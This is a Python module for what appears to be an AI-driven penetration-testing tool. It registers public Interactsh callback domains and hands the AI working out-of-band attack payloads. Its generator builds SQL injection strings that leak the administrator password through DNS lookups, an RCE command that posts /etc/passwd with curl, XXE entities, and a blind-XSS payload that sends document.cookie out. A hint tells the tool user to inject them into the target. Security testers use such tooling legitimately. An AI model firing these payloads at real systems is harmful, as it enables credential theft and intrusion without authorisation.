"""Out-of-band callback service for the assistant.

This module is the public API surface used by the AI tools (``oob_*``). The
old version was a stub that asked the user to paste callback events manually.
The new version routes through :mod:`argusai.core.security.interactsh_client`, which
registers a real correlation id with one of ProjectDiscovery's public
Interactsh servers (``oast.fun``, ``oast.live``, ...) and polls for events in
the background.

Modes (see ``oob.mode`` in settings):

* ``auto`` (default) — register a live Interactsh session on first use and
  hand out real subdomains. The session lives for the duration of the
  argusai process.
* ``disabled`` — fall back to the legacy "paste events_json yourself" stub.

Per-user controls live in user-level ``settings.json`` under the ``oob`` key.
"""

from __future__ import annotations

import logging
import threading
import time
import uuid
from typing import Any

from argusai.core.security.interactsh_client import (
    DEFAULT_SERVERS,
    InteractshClient,
)

log = logging.getLogger("argusai.oob")

_lock = threading.Lock()
_client: InteractshClient | None = None
_last_failure: str = ""


def _settings_dict() -> dict[str, Any]:
    try:
        from argusai.core.settings import SettingsManager

        mgr = SettingsManager()
        s = mgr.load()
        return {
            "mode": s.oob_mode,
            "server": s.oob_server,
            "poll_interval": s.oob_poll_interval,
            "legacy_callback_base": s.oob_callback_base,
        }
    except Exception as exc:
        log.debug("oob settings unavailable: %s", exc)
        return {"mode": "auto", "server": "", "poll_interval": 5.0, "legacy_callback_base": ""}


def _legacy_payloads(category: str, callback_base: str, probe_id: str = "", request_ref: str = "", case_id: str = "") -> dict[str, Any]:
    token = probe_id or f"argusai-{uuid.uuid4().hex[:12]}"
    base = (callback_base or "").strip().rstrip("/")
    host = f"{token}.oob.example.com" if not base else f"{base}/{token}"
    payloads = {
        "url": f"http://{host}" if "://" not in host else host,
        "dns": host.replace("http://", "").replace("https://", "").split("/")[0],
        "html": f'<img src="http://{host}" />' if "://" not in host else f'<img src="{host}" />',
    }
    if category in {"ssrf", "xxe"}:
        payloads["ssrf_url"] = payloads["url"]
        payloads["xxe_dtd"] = f'<!ENTITY % dtd SYSTEM "{payloads["url"]}/evil.dtd">%dtd;'
    if category in {"sqli", "rce"}:
        payloads["dns_marker"] = payloads["dns"]
    return {
        "ok": True,
        "configured": False,
        "mode": "manual",
        "category": category,
        "probe_id": token,
        "request_ref": request_ref,
        "case_id": case_id,
        "token": token,
        "host": payloads["dns"],
        "payloads": payloads,
        "hint": (
            "Auto OOB is disabled or unavailable. Generated a placeholder token only — "
            "use a real callback service (Burp Collaborator, your own DNS log, etc.) and "
            "paste any events into oob_check_events(events_json=...) for correlation."
        ),
    }


def _ensure_client(force: bool = False) -> tuple[InteractshClient | None, str]:
    """Return the live client, lazily registering on first use.

    Returns ``(client, reason)``. ``client`` is None if OOB is disabled or
    registration failed; ``reason`` then carries a human-readable explanation.
    """

    global _client, _last_failure
    settings = _settings_dict()
    mode = settings["mode"]
    if mode == "disabled":
        return None, "OOB disabled in settings (set oob.mode = 'auto' to enable)"
    with _lock:
        if _client and _client.is_registered and not force and not _client.is_unhealthy:
            return _client, ""
        # Shut down stale client before replacing
        if _client and (force or not _client.is_registered or _client.is_unhealthy):
            try:
                _client.shutdown()
            except Exception:
                pass
            _client = None
        preferred_server = (settings.get("server") or "").strip()
        server = preferred_server or DEFAULT_SERVERS[0]
        poll = float(settings.get("poll_interval") or 5.0)
        client = InteractshClient(
            server=server,
            poll_interval=poll,
            allow_fallback=not bool(preferred_server),
        )
        try:
            client.register()
        except Exception as exc:
            _last_failure = f"register on {server} failed: {exc}"
            log.warning(_last_failure)
            return None, _last_failure
        try:
            client.start_polling()
        except Exception as exc:
            _last_failure = f"poll thread failed to start: {exc}"
            log.warning(_last_failure)
            try:
                client.shutdown()
            except Exception:
                pass
            return None, _last_failure
        _client = client
        _last_failure = ""
        return client, ""


# ---------------------------------------------------------------------------
# Public tool functions (called from argusai.core._tools)
# ---------------------------------------------------------------------------


def oob_status() -> dict[str, Any]:
    """Report current OOB client state and supported categories."""

    settings = _settings_dict()
    mode = settings["mode"]
    base: dict[str, Any] = {
        "ok": True,
        "mode": mode,
        "configured": False,
        "supported_categories": ["ssrf", "xxe", "rce", "sqli", "blind-xss"],
    }
    if mode == "disabled":
        return {
            **base,
            "disabled_reason": "Set oob.mode='auto' in Settings to use Project Discovery's public Interactsh service.",
        }
    with _lock:
        client = _client
    if client and client.is_registered:
        snapshot = client.status()
        base.update(snapshot)
        base["configured"] = True
        return base
    base["disabled_reason"] = (
        _last_failure or
        "Auto OOB has not been started yet — call oob_start, or any oob_payload_generate "
        "will lazily register on first use."
    )
    return base


def oob_start(force: bool = False) -> dict[str, Any]:
    """Explicitly initialize the Interactsh session.

    Tools can call this once at the beginning of an OOB workflow to surface
    the callback domain to the user up-front. ``oob_payload_generate`` will
    auto-start it lazily, so explicit start is optional but recommended.
    """

    client, reason = _ensure_client(force=bool(force))
    if not client:
        return {
            "ok": False,
            "configured": False,
            "error": reason or "Failed to start OOB client",
        }
    return {
        "ok": True,
        "configured": True,
        **client.status(),
        "hint": (
            "Use the returned 'domain' as the suffix for payload exfiltration. "
            "Subdomains under it (e.g. <random>.<domain>) will record any DNS / HTTP / SMTP hit."
        ),
    }


def oob_stop() -> dict[str, Any]:
    """Deregister and stop the polling thread."""

    global _client
    with _lock:
        client = _client
        _client = None
    if client:
        try:
            client.shutdown()
        except Exception:
            pass
    return {"ok": True, "configured": False, "stopped": True}


def oob_payload_generate(category: str = "generic", callback_base: str = "", probe_id: str = "", request_ref: str = "", case_id: str = "") -> dict[str, Any]:
    """Generate ready-to-use OOB payloads for the given category.

    When auto mode is on, ``host`` is a real subdomain like
    ``ab1c2d3e.<correlation_id>.oast.fun`` — DNS lookups or HTTP requests to
    it become events you can read with ``oob_check_events(token=<host>)``.
    """

    settings = _settings_dict()
    mode = settings["mode"]
    if mode == "disabled":
        return _legacy_payloads(category, callback_base or settings.get("legacy_callback_base", ""), probe_id=probe_id, request_ref=request_ref, case_id=case_id)
    client, reason = _ensure_client(force=False)
    if not client:
        log.warning("falling back to manual OOB: %s", reason)
        result = _legacy_payloads(category, callback_base or settings.get("legacy_callback_base", ""), probe_id=probe_id, request_ref=request_ref, case_id=case_id)
        result["fallback_reason"] = reason
        return result
    label = (probe_id or uuid.uuid4().hex[:8]).strip().replace(".", "-")[:48]
    host = client.new_subdomain(label=label)
    http_url = f"http://{host}/"
    https_url = f"https://{host}/"
    payloads: dict[str, str] = {
        "url": http_url,
        "url_https": https_url,
        "dns": host,
        "subdomain_label": label,
        "html_img": f'<img src="{http_url}" />',
    }
    if category in {"ssrf", "xxe"}:
        payloads["ssrf_url"] = http_url
        payloads["xxe_dtd"] = f'<!ENTITY % dtd SYSTEM "{http_url}evil.dtd">%dtd;'
        payloads["xxe_inline"] = f'<!ENTITY xxe SYSTEM "{http_url}">'
    if category in {"sqli", "rce"}:
        payloads["dns_marker"] = host
    if category == "sqli":
        payloads["mysql_load_file_unix"] = (
            f"LOAD_FILE(CONCAT('/etc/',(SELECT password FROM users LIMIT 1),'.{host}'))"
        )
        payloads["mysql_load_file_windows"] = (
            f"LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.{host}\\\\a'))"
        )
        payloads["postgres_copy_program"] = (
            f"COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).{host}'"
        )
        payloads["postgres_dblink"] = (
            f"SELECT dblink_connect('host={host} user=x dbname=x password=x')"
        )
        payloads["mssql_xp_dirtree"] = (
            f"EXEC master..xp_dirtree '\\\\\\\\{host}\\\\a'"
        )
        payloads["mysql_exfil_via_subdomain"] = (
            f"AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='administrator'),'.{host}\\\\a'))"
        )
        payloads["oracle_utl_http"] = (
            f"SELECT UTL_HTTP.REQUEST('{http_url}') FROM dual"
        )
        # PortSwigger "Blind SQLi with out-of-band interaction" canonical
        # payload — works against Oracle even when UTL_HTTP / UTL_INADDR
        # are revoked, because EXTRACTVALUE + xmltype is exposed to PUBLIC.
        # The DNS lookup fires when Oracle's XML parser tries to fetch the
        # external DTD. Drop this whole string into a UNION SELECT or a
        # TrackingId cookie injection.
        payloads["oracle_extractvalue_xxe"] = (
            f"EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            f"<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{host}/\"> %remote;]>'),'/l') FROM dual"
        )
        # And the exfil-version that prefixes the leaked password as a DNS
        # label (Lab 17 style). Subselect the value you want and concatenate
        # before the host. NB Oracle requires URL-encoded chars in the DTD
        # URL when used inside a TrackingId — escape '+' or %20 as needed
        # at the injection site.
        payloads["oracle_extractvalue_xxe_exfil"] = (
            f"EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            f"<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.{host}/\"> %remote;]>'),'/l') FROM dual"
        )
        # MySQL DNS exfil via UDF (when FILE / UDF privs available).
        payloads["mssql_xp_cmdshell_curl"] = (
            f"EXEC master..xp_cmdshell 'nslookup {host}'"
        )
    if category == "rce":
        payloads["curl"] = f"curl {http_url}"
        payloads["wget"] = f"wget -q -O- {http_url}"
        payloads["nslookup"] = f"nslookup {host}"
        payloads["ping"] = f"ping -c 1 {host}"
        payloads["powershell_dns"] = f"powershell -c \"Resolve-DnsName {host}\""
        payloads["bash_exfil"] = f"curl --data-binary @/etc/passwd {http_url}"
    if category == "blind-xss":
        payloads["xss_script"] = f'<script src="{http_url}x.js"></script>'
        payloads["xss_img_onerror"] = f'<img src=x onerror="fetch(\'{http_url}\'+document.cookie)">'
    return {
        "ok": True,
        "mode": "auto",
        "configured": True,
        "category": category,
        "probe_id": label,
        "request_ref": request_ref,
        "case_id": case_id,
        "token": label,
        "host": host,
        "domain": client.domain,
        "server": client.server,
        "payloads": payloads,
        "hint": (
            "Inject one of the payloads above into the target. Then wait a few seconds and call "
            "oob_check_events(token='" + label + "') to read any DNS/HTTP callback that fired. "
            "Or wait synchronously: oob_check_events(token='" + label + "', wait_seconds=15)."
        ),
    }


def oob_check_events(
    token: str = "",
    probe_id: str = "",
    events_json: str = "",
    wait_seconds: float = 0.0,
    since: float = 0.0,
) -> dict[str, Any]:
    """Read OOB callback events matching ``token``.

    When auto mode is on, returns events captured by the live Interactsh
    poller. ``wait_seconds > 0`` blocks until at least one matching event
    arrives or the timeout expires — useful right after firing a payload.

    When auto mode is off (or the client failed), ``events_json`` is parsed
    as a list of events the user pasted manually.
    """

    settings = _settings_dict()
    mode = settings["mode"]
    token = token or probe_id
    out: dict[str, Any] = {
        "ok": True,
        "token": token,
        "probe_id": token,
        "configured": False,
        "events": [],
        "hits": [],
        "matched": False,
    }
    if mode != "disabled":
        with _lock:
            client = _client
        if client and client.is_registered and client.is_unhealthy:
            client, _ = _ensure_client(force=True)
        if client and client.is_registered:
            if wait_seconds and wait_seconds > 0:
                hits = client.wait_for_event(
                    token=token,
                    timeout=float(wait_seconds),
                    since=float(since or 0.0),
                )
            else:
                hits = client.events(token=token, since=float(since or 0.0))
            all_events = client.events(token="", since=float(since or 0.0))
            return {
                "ok": True,
                "configured": True,
                "mode": "auto",
                "token": token,
                "probe_id": token,
                "domain": client.domain,
                "server": client.server,
                "events": all_events,
                "hits": hits,
                "matched": bool(hits),
                "event_count": len(all_events),
                "polled_at": client.last_polled_at,
            }
    # Legacy / disabled fallback
    import json as _json

    try:
        events = _json.loads(events_json) if events_json else []
    except Exception:
        events = []
    if isinstance(events, dict):
        events = [events]
    if not isinstance(events, list):
        events = []
    hits = [e for e in events if token and token in str(e)]
    out.update({
        "mode": "manual",
        "events": events[:50],
        "hits": hits,
        "matched": bool(hits),
        "note": (
            _last_failure
            or "Auto OOB not running. Either set oob.mode='auto' in Settings or paste events into events_json manually."
        ),
    })
    return out


def now() -> float:
    """Convenience helper for callers wanting a baseline timestamp."""

    return time.time()
